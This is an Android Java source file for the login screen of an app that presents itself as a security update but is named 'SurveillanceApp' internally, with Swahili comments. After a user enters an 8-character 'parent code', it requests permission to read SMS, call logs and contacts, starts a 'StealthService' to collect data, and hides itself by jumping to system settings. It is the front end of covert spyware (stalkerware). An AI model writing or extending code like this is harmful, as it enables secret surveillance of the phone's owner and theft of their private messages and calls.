package com.security.update;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class LoginActivity extends AppCompatActivity {
    private EditText codeInput;
    private Button submitButton;
    private SharedPreferences prefs;
    private static final int PERMISSION_REQUEST_CODE = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);

        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        String savedCode = prefs.getString("parent_code", "");
        boolean isVerified = prefs.getBoolean("code_verified", false);
        boolean permissionsGranted = prefs.getBoolean("permissions_granted", false);

        // Kama kila kitu kimeshakamilika, anza stealth mode
        if (!savedCode.isEmpty() && isVerified && permissionsGranted) {
            startStealthAndHide(savedCode);
            return;
        }

        codeInput = findViewById(R.id.codeInput);
        submitButton = findViewById(R.id.submitButton);

        submitButton.setOnClickListener(v -> {
            String code = codeInput.getText().toString().trim().toUpperCase();

            if (code.isEmpty()) {
                Toast.makeText(this, "Tafadhali weka parent code!", Toast.LENGTH_SHORT).show();
                return;
            }

            if (code.length() != 8) {
                Toast.makeText(this, "Parent code lazima iwe herufi 8!", Toast.LENGTH_SHORT).show();
                return;
            }

            // Weka parent code na omba permissions
            saveCodeAndRequestPermissions(code);
        });
    }

    private void saveCodeAndRequestPermissions(String code) {
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString("parent_code", code);
        editor.putBoolean("code_verified", true);
        editor.apply();

        // Omba permissions chache tu
        requestPermissions();
    }

    private void requestPermissions() {
        String[] permissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS
        };

        ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Weka kuwa permissions zimekubaliwa
            SharedPreferences.Editor editor = prefs.edit();
            editor.putBoolean("permissions_granted", true);
            editor.apply();

            // Anza stealth mode na kujificha
            startStealthAndHide(prefs.getString("parent_code", ""));
        }
    }

    private void startStealthAndHide(String code) {
        // Anza service ya kusaka data
        Intent stealthIntent = new Intent(this, StealthService.class);
        stealthIntent.putExtra("PARENT_CODE", code);
        startService(stealthIntent);

        // Ficha app kwenye system settings
        hideAppToSystemSettings();
    }

    private void hideAppToSystemSettings() {
        try {
            // Open system settings ili kuficha app
            Intent settingsIntent = new Intent(Settings.ACTION_SETTINGS);
            settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(settingsIntent);
            
            // Maliza activity hii
            finish();
            
        } catch (Exception e) {
            // Ikiwa haifai, finish tu
            finish();
        }
    }
}
